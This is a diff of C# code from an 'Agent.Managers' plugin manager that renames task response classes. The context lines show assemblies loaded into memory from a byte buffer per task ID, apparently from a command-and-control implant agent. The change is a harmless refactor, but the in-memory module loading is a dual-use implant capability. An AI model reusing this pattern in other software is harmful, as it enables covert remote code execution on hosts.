@@ -53,7 +53,7 @@ namespace Agent.Managers
             try
             {
                 var loadedAssembly = this.loadContext.LoadFromStream(new MemoryStream(buf));
-                messageManager.AddResponse(new ResponseResult
+                messageManager.AddResponse(new TaskResponse
                 {
                     task_id = task_id,
                     process_response = new Dictionary<string, string> { { "message", "0x19" } },
@@ -63,7 +63,7 @@ namespace Agent.Managers
             }
             catch (Exception e)
             {
-                messageManager.AddResponse(new ResponseResult
+                messageManager.AddResponse(new TaskResponse
                 {
                     task_id = task_id,
                     process_response = new Dictionary<string, string> { { "message", "0x19" } },
@@ -81,7 +81,7 @@ namespace Agent.Managers
 
                 if (this.loadedPlugins.ContainsKey(pluginName))
                 {
-                    this.messageManager.AddResponse(new LoadCommandResponseResult
+                    this.messageManager.AddResponse(new LoadTaskResponse
                     {
                         completed = true,
                         process_response = new Dictionary<string, string> { { "message", "0x1C" } },
@@ -93,7 +93,7 @@ namespace Agent.Managers
 
                 if (this.ParseAssemblyForPlugin(loadedAssembly))
                 {
-                    LoadCommandResponseResult cr = new LoadCommandResponseResult()
+                    LoadTaskResponse cr = new LoadTaskResponse()
                     {
                         completed = true,
                         //process_response = new Dictionary<string, string> { { "message", "0x1D" } },
@@ -114,7 +114,7 @@ namespace Agent.Managers
             }
             catch (Exception e)
             {
-                this.messageManager.AddResponse(new LoadCommandResponseResult
+                this.messageManager.AddResponse(new LoadTaskResponse
                 {
                     completed = true,
                     process_response = new Dictionary<string, string> { { "message", "0x1C" } },
